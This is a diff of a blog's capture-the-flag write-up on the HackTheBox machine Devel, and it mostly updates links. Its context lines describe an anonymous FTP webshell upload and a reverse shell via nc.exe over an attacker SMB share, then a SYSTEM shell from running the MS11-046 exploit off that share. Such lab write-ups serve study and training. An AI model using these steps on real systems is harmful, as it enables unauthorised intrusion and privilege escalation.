@@ -12,7 +12,7 @@ mermaid: true
 
 ## TL;DR
 
-This writeup is based on [__Devel__](https://www.hackthebox.eu/home/machines/profile/3) which is an easy-rated machine on HackTheBox. It starts with FTP and HTTP. I will use FTP anonymous login to upload a webshell to get shell on the machine. Later on, I’ll use one of many Windows kernel exploit to gain system shell. It requires some basic privilege escalation for the root flag.
+This writeup is based on [__Devel__](https://app.hackthebox.com/machines/Devel){:target="_blank"} which is an easy-rated machine on HackTheBox. It starts with FTP and HTTP. I will use FTP anonymous login to upload a webshell to get shell on the machine. Later on, I’ll use one of many Windows kernel exploit to gain system shell. It requires some basic privilege escalation for the root flag.
 
 ## Scanning Network
 
@@ -105,7 +105,7 @@ ftp 10.129.152.23
 
 ### FTP Exploitation (File Upload)
 
-We successfully uploaded our test file to the machine. Now, we can upload a simple web shell to the machine. If you search for web shells on Google, you will get tons of shells. I like to use web shell from [__SecLists__](https://github.com/danielmiessler/SecLists). Later on we will visit to <ip address>/cmd.aspx.
+We successfully uploaded our test file to the machine. Now, we can upload a simple web shell to the machine. If you search for web shells on Google, you will get tons of shells. I like to use web shell from [__SecLists__](https://github.com/danielmiessler/SecLists){:target="_blank"}. Later on we will visit to <ip address>/cmd.aspx.
 
 ```bash
 ftp 10.129.152.23
@@ -135,7 +135,7 @@ As also we can run `dir` to see the files, we get to know the directory path of 
 
 ![Directory path of the machine](/assets/images/writeups/Devel-HTB/6.png)
 
-As we can see that the user is `iis appool\web`, we have some ways to get shell by using nc.exe, [__Nishang__](https://github.com/samratashok/nishang) and Meterpreter. I will use nc.exe to get the shell.
+As we can see that the user is `iis appool\web`, we have some ways to get shell by using nc.exe, [__Nishang__](https://github.com/samratashok/nishang){:target="_blank"} and Meterpreter. I will use nc.exe to get the shell.
 
 I’ll make a directory name `h4xploit` and copy nc.exe in the directory. I will run now smb server.
 
@@ -185,7 +185,7 @@ Now, we have to use exploit suggestor as WinPEAS, Watson or msfconsole’s local
 
 ### Privilege Escalation (Using Watson)
 
-I already transferred the Watson.exe to the target system using smbserver. If you want to download Watson.exe, then visit [__Watson__](https://github.com/rasta-mouse/Watson) .
+I already transferred the Watson.exe to the target system using smbserver. If you want to download Watson.exe, then visit [__Watson__](https://github.com/rasta-mouse/Watson){:target="_blank"}.
 
 Now, let’s run the watson.exe and see the suggested exploits for privilege escalation.
 
@@ -225,14 +225,14 @@ c:\Windows\Microsoft.NET\Framework>\10.10.14.61\share\Watson.exe
 
 [] Finished. Found 5 vulns :)
 ```
-As you can see the suggested exploits above using Watson.exe. Now, I’ll choose [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046) because I found it compatible with our requirements and easily available on [__WindowsExploits__](https://github.com/abatchy17/WindowsExploits). If you see the source of the exploit it shows:
+As you can see the suggested exploits above using Watson.exe. Now, I’ll choose [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046){:target="_blank"} because I found it compatible with our requirements and easily available on [__WindowsExploits__](https://github.com/abatchy17/WindowsExploits){:target="_blank"}. If you see the source of the exploit it shows:
 
 ```bash
 Privileged shell execution:  
      - the SYSTEM shell will spawn within the invoking shell/process
 ```
 
-For getting system shell, we have [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046), this is a precompiled exe that spawn system shell within current shell. I will save this exe in my smb share and run it on the current shell. If you want to know more about MS11-046, then you can visit [__here__](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046).
+For getting system shell, we have [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046){:target="_blank"}, this is a precompiled exe that spawn system shell within current shell. I will save this exe in my smb share and run it on the current shell. If you want to know more about MS11-046, then you can visit [__here__](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046){:target="_blank"}.
 
 ```bash
 c:\Users>\\10.10.14.61\share\MS11-046.exe
@@ -387,4 +387,4 @@ c:\Users>cd Administrator/Desktop
  c:\Users\Administrator\Desktop>
 ```
 
-Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).
+Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.
